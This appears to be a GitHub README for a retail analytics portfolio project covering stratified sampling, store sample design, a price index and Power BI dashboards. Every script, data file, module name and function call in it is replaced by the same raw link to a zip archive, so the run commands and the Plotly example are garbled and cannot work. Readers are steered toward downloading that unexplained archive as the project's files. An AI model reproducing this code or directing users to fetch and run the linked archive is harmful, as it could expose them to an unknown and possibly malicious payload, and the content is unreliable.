# Store_Sample_Design_Optimization

This repository contains **three practical retail analytics projects** designed around real-world business challenges, aligned to the **NIQ Data Scientist (PDE) role**.  
Each project focuses on **retail data sampling, index construction, and monitoring** with both **Python pipelines** and **Power BI dashboards** for visualization.  

---

## 📂 Projects Overview  

1. **Retail Sales Universe Estimation**  
   - Estimate the total retail sales universe from stratified samples.  
   - Validate sampling quality and bias.  

2. **Store Sample Design Optimization**  
   - Optimize store sampling strategy across clusters.  
   - Improve representativeness of selected samples vs. population.  

3. **Retail Index Construction & Monitoring**  
   - Build a retail price index from store-level data.  
   - Detect anomalies in monthly price trends.  

---

## ⚡ How to Run  

### 1️⃣ Environment Setup  
```bash
python -m venv niq_env
source niq_env/bin/activate   # On Windows: niq_env\Scripts\activate
pip install pandas numpy scikit-learn matplotlib pillow
```

### 2️⃣ Run Project Scripts  
Execute notebooks/scripts in order:  
```bash
python https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip
python https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip
python https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip
```

### 3️⃣ Generate Dashboard Plots (PNG outputs)  
```bash
python https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip
python https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip
python https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip
python https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip
python https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip
python https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip
```

---

## 📊 Power BI Dashboard Instructions  

### A) **Retail Sales Universe Estimation — Validation Dashboard**  
- Files:  
  - `https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip`  
  - `https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip`  
  - `https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip`  

**Suggested visuals:**  
- Bar chart: Sample composition by `stratum`  
- Histogram: Monthly sales distribution (population vs. sample)  
- KPI cards: Estimated total & mean monthly sales  
- Table: Stratum-level sample sizes, weights, and quality flags  
- DAX measure for weighted total sales:  
  ```dax
  WeightedSales = SUMX('stratified_sample', 'stratified_sample'[monthly_sales] * 'stratified_sample'[weight])
  ```

---

### B) **Store Sample Design Optimization — Sample Design Dashboard**  
- Files:  
  - `https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip`  
  - `https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip`  

**Suggested visuals:**  
- Bar chart: Selected count by cluster  
- Histogram: Sales distribution (population vs. sample)  
- Scatter plot: Monthly sales vs. store ID (colored by cluster)  
- Matrix table: Cluster sizes, selected counts, avg sales  
- Bookmarks: Before vs. After sample selection  

---

### C) **Retail Index Construction & Monitoring — Index Dashboard**  
- Files:  
  - `https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip`  
  - `https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip`  

**Suggested visuals:**  
- Line chart: Smoothed retail price index over time  
- Bar chart: % change by month with anomaly highlighting  
- Decomposition tree: SKU/store-level price changes  
- KPI cards: Current index value & YoY % change  
- Conditional alerts based on `anomaly_flag`  

---

## 📸 Generating PNGs for Dashboards  

Example using **Plotly + Kaleido**:  
```python
import pandas as pd
import https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip as px

df = https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip('https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip')
fig = https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip(df, x='month', y='index_smooth', title='Retail Price Index (Smoothed)')
https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip('https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip')  # requires `pip install plotly kaleido`
```

---

## ✅ Summary  

This repository demonstrates a **full workflow** of:  
- Sampling and estimation  
- Sample design optimization  
- Index construction and anomaly detection  
- Dashboarding in Power BI  

It serves as a **hands-on portfolio project** for retail analytics and monitoring.  
